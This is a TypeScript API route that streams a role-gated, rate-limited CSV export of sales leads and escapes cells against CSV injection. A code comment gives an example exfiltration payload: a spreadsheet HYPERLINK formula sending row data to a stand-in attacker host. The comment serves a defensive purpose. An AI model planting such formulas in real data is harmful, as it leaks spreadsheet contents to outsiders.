import { sql } from 'drizzle-orm'
import { db } from '@/db/client'
import { withError } from '@/lib/api/withError'
import { requireRole } from '@/lib/auth/requireRole'
import { checkExportRate } from '@/lib/auth/cmsRateLimit'
import { env } from '@/lib/env'

// Streamed CSV export of /leads — Admin and Editor only (viewer
// already gets masked rows on the list; permitting them to download
// a CSV defeats the masking). A viewer who hits the URL directly
// gets a 302 back to /admin/leads so the endpoint doesn't 403-
// confirm its JSON shape — matches the newsletter export contract.
//
// Two protections against CSV-injection in Excel/Numbers/Sheets:
//   1. Cell prefix escape: any cell beginning with =/+/-/@/CR/LF/TAB
//      gets a leading single-quote, which spreadsheets render as a
//      literal '. Without this an attacker can paste
//      `=HYPERLINK("http://evil.tld/?d="&A1, "click")` into the
//      message field; importing the CSV silently exfiltrates row A1.
//   2. UTF-8 BOM at the head of the stream so Excel detects
//      encoding correctly (otherwise non-ASCII names render as
//      mojibake on en-US Windows installs).
//
// Keyset-batched streaming: an earlier version of this route loaded
// the FULL result into a JS array via `db.execute(SELECT ... LIMIT N)`
// before emitting a single byte — peak heap was ~50MB at N=100k. The
// current pattern walks the (created_at, id) keyset in BATCH_SIZE
// chunks, enqueuing rows from each batch and yielding control between
// batches so the runtime can flush + back-pressure naturally.
//
// Network buffering disabled via x-accel-buffering: no so nginx /
// CDN proxies flush each chunk to the client instead of buffering
// the whole CSV before delivery.

const BATCH_SIZE = 1000
const PREFIX = /^[=+\-@\t\r\n]/

function cell(v: unknown): string {
  if (v == null) return ''
  const s = v instanceof Date ? v.toISOString() : String(v)
  const safe = PREFIX.test(s) ? `'${s}` : s
  return `"${safe.replace(/"/g, '""')}"`
}

interface ExportRow {
  id: number
  source: string
  name: string | null
  email: string | null
  phone: string | null
  project_slug: string | null
  status: string
  message: string | null
  created_at: Date
}

const HEADER =
  'id,source,name,email,phone,project_slug,status,message,created_at\n'

function formatRow(r: ExportRow): string {
  return (
    [
      r.id,
      r.source,
      r.name,
      r.email,
      r.phone,
      r.project_slug,
      r.status,
      r.message,
      r.created_at,
    ]
      .map(cell)
      .join(',') + '\n'
  )
}

export const GET = withError(async () => {
  // Accept viewer at the role gate, then short-circuit to a 302 so the
  // endpoint doesn't 403-confirm its JSON shape to a logged-in viewer
  // who saved the URL — matches the newsletter export contract so the
  // two surfaces present the same auth-redirect behaviour.
  const ctx = await requireRole(['admin', 'editor', 'viewer'])
  if (ctx.role === 'viewer') {
    return new Response(null, {
      status: 302,
      headers: { location: '/admin/leads' },
    })
  }
  // Export-specific tighter limit (5/min) — each call holds a DB
  // connection across multiple keyset batches. Standard read limit
  // (120/min) would let a stolen cookie chain enough exports to
  // exhaust the node heap.
  checkExportRate(ctx.userId)

  const MAX_ROWS = env.LEADS_EXPORT_MAX_ROWS

  const stream = new ReadableStream<Uint8Array>({
    async start(controller) {
      const enc = new TextEncoder()
      try {
        // UTF-8 BOM: ﻿ (3-byte EF BB BF in UTF-8). Excel uses it
        // to auto-detect Unicode; without it diacritics in Ghanaian
        // names degrade to ?-marks on Windows.
        controller.enqueue(enc.encode('\ufeff'))
        controller.enqueue(enc.encode(HEADER))

        // Keyset cursor: (created_at, id) DESC. Start at the maximum
        // possible value so the first batch returns the newest rows.
        // MySQL TIMESTAMP(3) maxes at 2038 for 32-bit signed; the
        // year-9999 sentinel coerces to that boundary via MySQL's
        // out-of-range rejection only when used as a column value,
        // not as a parameter binding. Drizzle binds it as a Date
        // object — MySQL compares it as a literal timestamp string.
        let lastCreatedAt: Date | null = null
        let lastId: number | null = null
        let total = 0

        for (;;) {
          const remaining = MAX_ROWS - total
          if (remaining <= 0) break
          const batchLimit = Math.min(BATCH_SIZE, remaining)

          // Exclude soft-deleted rows from the export — a trashed
          // lead is not part of the operator's working set, and we
          // don't want the spreadsheet to surface PII the operator
          // already moved to Trash.
          const where =
            lastCreatedAt === null
              ? sql`WHERE l.deleted_at IS NULL`
              : sql`WHERE l.deleted_at IS NULL AND (l.created_at, l.id) < (${lastCreatedAt}, ${lastId})`

          const [rows] = (await db.execute(sql`
            SELECT l.id, l.source, l.name, l.email, l.phone,
                   p.slug AS project_slug, l.status, l.message, l.created_at
            FROM leads l
            LEFT JOIN projects p ON p.id = l.project_id
            ${where}
            ORDER BY l.created_at DESC, l.id DESC
            LIMIT ${batchLimit}
          `)) as unknown as [ExportRow[]]

          if (rows.length === 0) break

          for (const r of rows) {
            controller.enqueue(enc.encode(formatRow(r)))
            total++
          }

          const last = rows[rows.length - 1]
          if (!last) break
          lastCreatedAt = last.created_at
          lastId = last.id

          // Yield to the event loop so back-pressure from the response
          // writer can apply between batches — keeps the heap bounded
          // even under slow downstream consumers.
          await new Promise<void>((resolve) => setImmediate(resolve))
        }
        controller.close()
      } catch (err) {
        // Surface DB / encoding errors as a stream error rather than
        // silently truncating mid-export — the browser then aborts the
        // download and the operator sees a failed transfer instead of
        // a half-complete CSV that looks fine.
        controller.error(err)
      }
    },
  })

  const today = new Date().toISOString().slice(0, 10)
  return new Response(stream, {
    status: 200,
    headers: {
      'content-type': 'text/csv; charset=utf-8',
      'content-disposition': `attachment; filename="bwc-leads-${today}.csv"`,
      'x-accel-buffering': 'no',
      'cache-control': 'private, no-store',
    },
  })
})
